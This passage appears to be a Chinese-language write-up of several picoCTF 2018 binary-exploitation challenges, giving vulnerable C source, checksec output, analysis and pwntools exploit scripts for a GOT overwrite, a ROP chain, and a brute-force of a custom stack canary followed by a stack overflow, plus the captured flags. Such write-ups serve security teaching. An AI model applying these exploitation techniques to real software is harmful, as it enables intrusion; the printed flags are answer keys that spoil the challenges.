    }
    int main(int argc, char **argv) {
      setvbuf(stdout, NULL, _IONBF, 0);
      char buf[256];
      unsigned int address;
      unsigned int value;
      puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");
      scanf("%x", &address);
      sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
      puts(buf);
      scanf("%x", &value);
      sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
      puts(buf);
      *(unsigned int *)address = value;
      puts("Okay, exiting now...n");
      exit(1);
    }
开始还以为自己是不是C没学好，这题怎么可能这么简单输入两个地址就getshell了，结果发现还真的是。程序的逻辑大致为输入一个十六进制的地址，然后再输入一个十六进制的数值，然后把第一次输入的地址的值替换成输入的数值，我们可以很容易想到用win函数的地址去替换puts_got，这样在程序调用puts时就相当调用了win函数来getshell
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    #n = process('./auth')
    n = remote('2018shell2.picoctf.com',23731)
    elf = ELF('./auth')
    puts_got = elf.got['puts']
    win_addr = 0x0804854B
    n.sendline(hex(puts_got))
    sleep(0.1)
    n.sendline(hex(win_addr))
    n.interactive()
FLAG
    picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
###  rop chain
    ➜  ropchain file rop 
    rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped
    ➜  ropchain checksec rop 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
看一下源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 16
    bool win1 = false;
    bool win2 = false;
    void win_function1() {
      win1 = true;
    }
    void win_function2(unsigned int arg_check1) {
      if (win1 && arg_check1 == 0xBAAAAAAD) {
        win2 = true;
      }
      else if (win1) {
        printf("Wrong Argument. Try Again.n");
      }
      else {
        printf("Nope. Try a little bit harder.n");
      }
    }
    void flag(unsigned int arg_check2) {
      char flag[48];
      FILE *file;
      file = fopen("flag.txt", "r");
      if (file == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(flag, sizeof(flag), file);
      if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
        printf("%s", flag);
        return;
      }
      else if (win1 && win2) {
        printf("Incorrect Argument. Remember, you can call other functions in between each win function!n");
      }
      else if (win1 || win2) {
        printf("Nice Try! You're Getting There!n");
      }
      else {
        printf("You won't get the flag that easy..n");
      }
    }
    void vuln() {
      char buf[16];
      printf("Enter your input> ");
      return gets(buf);
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      vuln();
    }
审计过代码后我们可以得到程序中各个函数的功能和作用，像win_function1函数的作用为将全局变量win1的值赋为1，win_function2函数的作用是在win1非0且传入的参数为0xBAAAAAAD时将全局变量win2的值赋为1，flag函数的作用是当全局变量win1，win2都不为0且传入的参数为0xDEADBAAD时输出flag，这样我们就知道要通过vuln函数里的栈溢出来构造ROP去分别执行这三个函数getflag
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./rop')
    elf = ELF('./rop')
    func1 = 0x080485CB
    func2 = 0x080485d8
    flag = 0x0804862B
    pop_ret = 0x080485d6
    buf = 'a'*0x18
    payload = buf + 'aaaa'
    payload += p32(func1)+p32(pop_ret) + p32(0)
    payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD)
    payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD)
    n.recvuntil('>')
    n.sendline(payload)
    n.interactive()
FLAG
    picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
###  buffer overflow 3
    ➜  bufferoverflow3 file vuln 
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped
    ➜  bufferoverflow3 checksec vuln
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
嗯，没开canary，看一波源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 32
    #define FLAGSIZE 64
    #define CANARY_SIZE 4
    void win() {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(buf,FLAGSIZE,f);
      puts(buf);
      fflush(stdout);
    }
    char global_canary[CANARY_SIZE];
    void read_canary() {
      FILE *f = fopen("canary.txt","r");
      if (f == NULL) {
        printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fread(global_canary,sizeof(char),CANARY_SIZE,f);
      fclose(f);
    }
    void vuln(){
       char canary[CANARY_SIZE];
       char buf[BUFSIZE];
       char length[BUFSIZE];
       int count;
       int x = 0;
       memcpy(canary,global_canary,CANARY_SIZE);
       printf("How Many Bytes will You Write Into the Buffer?n> ");
       while (x ");
       read(0,buf,count);
       if (memcmp(canary,global_canary,CANARY_SIZE)) {
          printf("*** Stack Smashing Detected *** : Canary Value Corrupt!n");
          exit(-1);
       }
       printf("Ok... Now Where's the Flag?n");
       fflush(stdout);
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      int i;
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      read_canary();
      vuln();
      return 0;
    }
打开审计后发现它自己实现了一个简易的Canary防护函数，我们针对canary常用的攻击方式中Stack Smashing Protector Leak
攻击可以立马否决，因为错误回显并没有输出avgr[0]这个必要条件。程序中canary的值是从一个内容不变的文本文档中读取的，所以我们可以通过写爆破脚本去把canary的具体内容输出出来。
通过ida我们可以得到canary插入在栈上0x10的位置，输入的首地址位于栈上0x30，
      char buf; // [esp+28h] [ebp-30h]
      int canary; // [esp+48h] [ebp-10h]
我们运行程序测试一下
    ➜  bufferoverflow3 ./vuln
    How Many Bytes will You Write Into the Buffer?
    > 32
    Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Ok... Now Where's the Flag?
    ➜  bufferoverflow3 ./vuln
    How Many Bytes will You Write Into the Buffer?
    > 33
    Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    *** Stack Smashing Detected *** : Canary Value Corrupt!
确认canary插入的位置为0x20
bp.py
    from pwn import*
    #canary = 'h_?='
    canary = ''
    for i in range(4):
            for a in range(0xff):
                    n = process('./vuln')
                    n.recvuntil('> ')
                    n.sendline('36')
                    n.recvuntil('Input> ')
                    payload = 'a'*0x20+canary+chr(a)
                    #print chr(a)
                    n.send(payload)
                    try:
                            n.recvuntil('*** Stack Smashing Detected ***')
                    except:
                            if canary=='':
                                canary = chr(a)
                            else:
                                canary += chr(a)
                            n.close()
                            break
                    else:
                            n.close()
    print 'canary:',canary
通过爆破我们得到canary的值为”h_?=”实在是鬼畜，本以为是PICO的我还是太天真了
在知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至win函数就能get flag了
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./vuln')
    elf = ELF('./vuln')
    canary = 'h_?='
    win_addr = 0x080486EB
    payload = 'a'*0x20+canary+'a'*(0x10-len(canary)+4)+p32(win_addr)
    n.recvuntil('> ')
    n.sendline('100')
    n.recvuntil('Input> ')
    n.sendline(payload)
    n.interactive()
###  echo back
    ➜  echo back file echoback 
    echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped
    ➜  echo back checksec echoback 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
开了NX和Canary，审计下源码……然而这题并没有给，那就开ida看一下程序干了些什么
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      __gid_t v3; // ST1C_4
      setvbuf(_bss_start, 0, 2, 0);
      v3 = getegid();